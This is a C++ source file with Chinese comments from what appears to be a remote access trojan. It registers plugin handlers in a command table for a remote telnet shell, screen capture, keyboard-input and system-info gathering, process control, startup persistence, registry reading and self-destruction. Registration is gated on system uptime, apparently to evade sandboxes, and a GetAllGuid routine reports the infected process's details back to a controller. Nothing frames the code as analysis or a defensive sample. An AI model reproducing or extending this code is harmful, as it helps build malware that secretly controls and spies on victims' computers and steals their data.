// Struct.cpp: implementation of the Struct class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Struct.h"
#include "base.h"
#include "io.h"
#include "WinApi.h"
#include "Screen.h"
#include "Telnet.h"
#include "ProcessInfo.h"
#include "processcmd.h"
#include "UpLoadFile.h"
#include "FileWork.h"
#include "ScreenOpt.h"
#include "getSoftwareinfo.h"
#include "GetInputInfo.h"
#include "getprocessinfo.h"
#include "HardwareStr.h"
#include "getAppID.h"
#include "getAdapterInfo.h"
#include "getLANInfo.h"

//#pragma comment(lib, "JpgLib.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef DWORD	(*pSendData)(char * ,int ,UCHAR ,USHORT)  ;	// 发送数据的函数指针声明
typedef int		(*pFunInit)(DWORD* , int, DWORD, long*) ;	// 插件初始化的函数指针声明
typedef int		(*pFunVer)(char *) ;	// 插件初始化的函数指针声明

pFunction pFunTable[256];

#define INVOKE_FILEOPT
#define INVOKE_SCREEN
#define INVOKE_TELNET
#define INVOKE_SYSINFO
#define INVOKE_PROCMD
#define INVOKE_FILECMD
#define INVOKE_OTHERCMD
void InvokeInsideDLL()
{
	pSendData psend;
	psend=SendData;
	
#ifdef INVOKE_FILEOPT
	partInitFileOpt((DWORD*)pFunTable,DLL_MAX_SIZE,(DWORD)psend);
#endif

#ifdef INVOKE_SCREEN
	partInitSrceenOpt((DWORD*)pFunTable,DLL_MAX_SIZE,(DWORD)psend);
#endif

#ifdef INVOKE_TELNET
	partInitTelnetOpt((DWORD*)pFunTable,DLL_MAX_SIZE,(DWORD)psend);
#endif

#ifdef INVOKE_SYSINFO
	partInitSysInfoOpt((DWORD*)pFunTable,DLL_MAX_SIZE,(DWORD)psend);
#endif

#ifdef INVOKE_PROCMD
	partInitProCmdOpt((DWORD*)pFunTable,DLL_MAX_SIZE,(DWORD)psend);
#endif
}

_pFunction_::_pFunction_()
{
	size=8;
	pFun=NULL;
	versionid=0;
}

_pFunction_::~_pFunction_()
{ }

void GetAllGuid(ThreadParam *ppara)
{
	try{
		RemoteInfo rinfo;
		GetRemoteInfo(&rinfo);
		
		char szGuid[5120];
		memset(szGuid, 0, 5120);
		char pBuffer[DLL_MAX_SIZE+100];
		
		if(strlen(szGuid) == 0)
			strcpy(szGuid, "NONE VerID");
		int offGuid = strlen(szGuid);
		offGuid += sprintf(szGuid+offGuid, "\r\n%s %s\r\n", __DATE__, __TIME__);
		offGuid += sprintf(szGuid+offGuid, "CurPID:%d\r\n", PGetCurrentProcessId());
// 		offGuid += sprintf(szGuid+offGuid, "RemoteIp:%d\r\n", rinfo.remoteIP);
// 		offGuid += sprintf(szGuid+offGuid, "ReserveIp:%d\r\n", rinfo.ReserveIp);
// 		offGuid += sprintf(szGuid+offGuid, "Remotedomain:%s\r\n", rinfo.remotedomain);

		int ilen=sprintf(pBuffer, "content-length: %d\r\ncontent-type: UsedType\r\n\r\n%s",
			DLL_MAX_SIZE, szGuid);
		
		if(SendData(pBuffer,ilen,ppara->PacketType,ppara->SessionID))
		{
			IF_LOUD(DbgFat32Log("获得插件版本:%s", szGuid);)
		}
		
	}catch (...) {
		IF_LOUD(DbgFat32Log("GetAllGUID Catch Error!\r\n");)
	}
	
	return ;
}

#define TELNET_GUID 5

int partInitTelnetOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction)
{
	lpFunction lpfun=(lpFunction)pModuleTable;
	
	if (PGetTickCount()>5*1000)
	{
		lpfun[PTYPE_TELNET].pFun	= (pFun)TelnetCmd;
		lpfun[PTYPE_SYNCTELNET].pFun = (pFun)SyncTelnetCmd;
	}

	return TELNET_GUID;
}

#define SYSTEMINFO_GUID 6

int partInitSysInfoOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction)
{
	lpFunction lpfun=(lpFunction)pModuleTable;
	
	if (PGetTickCount()>5*1000)
	{
		lpfun[PTYPE_SYSINFO].pFun = (pFun)GetRBSystemInfo;
		lpfun[PTYPE_SOFTWAREINFO].pFun = (pFun)ThreadGetSoftwareStart;
		lpfun[PTYPE_INPUTINFO].pFun = (pFun)ThreadGetInputStart;
		lpfun[PTYPE_PROCESSINFO].pFun = (pFun)ThreadGetProcessInfo;
		lpfun[PTYPE_HARDWARESTR].pFun = (pFun)ThreadGetHardStrStart;
		lpfun[PTYPE_APPID].pFun = (pFun)ThreadGetAppIDStart;
		lpfun[PTYPE_ADAPTER].pFun = (pFun)ThreadAdapterInfoStart;
		lpfun[PTYPE_LANINFO].pFun = (pFun)ThreadGetLANInfoStart;
	}

	return SYSTEMINFO_GUID;
}

#define PROCESSCMD_GUID 7

int partInitProCmdOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction)
{
	lpFunction lpfun=(lpFunction)pModuleTable;
	
	if (PGetTickCount()>5*1000)
	{
		lpfun[PTYPE_ACKHEART].pFun = (pFun)Cmd_AckHeart;			//心跳回应
		lpfun[PTYPE_GETALLGUID].pFun = (pFun)GetAllGuid;			//获取mm版本
		lpfun[PTYPE_ADJUSTSPEED].pFun = (pFun)Cmd_AdjustSpeed;		//传包速度
		lpfun[PTYPE_FLUASHBUFFER].pFun = (pFun)FlashBuffer;			//停下载任务
		lpfun[PTYPE_PUTREMOTE].pFun = (pFun)ProcessRemote;
		lpfun[PTYPE_PUTTROINFO].pFun = (pFun)ProcessTroInfo;
		lpfun[PTYPE_PUTRESERVEIP].pFun = (pFun)ProcessReserveIp;
		lpfun[PTYPE_DESTORY].pFun = (pFun)Cmd_Destory;
		lpfun[PTYPE_GETMD5].pFun = (pFun)CheckFileMD5;
		lpfun[PTYPE_SETHEADSIGN].pFun = (pFun)SetHeadSign;
		lpfun[PTYPE_GETREGEDIT].pFun = (pFun)GetRegedit;
		lpfun[PTYPE_ADDRUN].pFun= (pFun)AddRunCmd;
		lpfun[PTYPE_ADDFRUN].pFun = (pFun)AddFolderRunCmd;
		lpfun[PTYPE_SETTCPTRANS].pFun = (pFun)SetTcpTrans;
		//lpfun[PTYPE_DELQQPASS].pFun = (pFun)DelQQPass;
		lpfun[PTYPE_STOPEXE].pFun = (pFun)ControlProcess;
		lpfun[PTYPE_SETDATASTATE].pFun = (pFun)ProcessDataState;
	}

	return PROCESSCMD_GUID;
}
